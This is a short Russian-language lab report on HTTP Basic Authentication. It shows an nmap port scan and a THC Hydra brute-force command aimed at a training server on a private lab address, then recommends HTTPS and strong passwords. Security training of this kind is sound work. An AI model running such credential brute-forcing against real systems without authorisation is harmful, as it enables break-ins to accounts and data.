# Отчёт 03 — HTTP Basic Authentication и подбор с помощью THC Hydra

## Цель
Найти порт, где работает учебный HTTP-сервер и подобрать логин/пароль для получения файла users.txt.

## Окружение
- Ubuntu: запущённый `server-x64.bin` на порту в диапазоне 9000-9999
- Kali: hydra, nmap, wireshark

## Шаги (пример)
1. На Ubuntu:
```bash
chmod +x ./server-x64.bin
./server-x64.bin &
# сервер отобразит порт, но в лаборатории вы можете его не знать заранее
```
2. На Kali: сканирование портов
```bash
nmap -p9000-9999 -sV -Pn 10.0.0.11 -oN results/nmap_9000-9999.txt
```
3. Hydra:
```bash
hydra -L logins.txt -P passwords.txt -s 9123 -f 10.0.0.11 http-get /users.txt
```

## Пример результата
- `results/hydra_result.txt` — демонстрационный вывод hydra с найденной парой логин:password.
- `results/users.txt` — примерный список пользователей, полученный после авторизации.

## Выводы
- Basic auth передаёт `Authorization: Basic <base64>` — видно в Wireshark.
- Рекомендации: не хранить пароли в открытых файлах, применять HTTPS, использовать сильные пароли и ограничивать доступ.
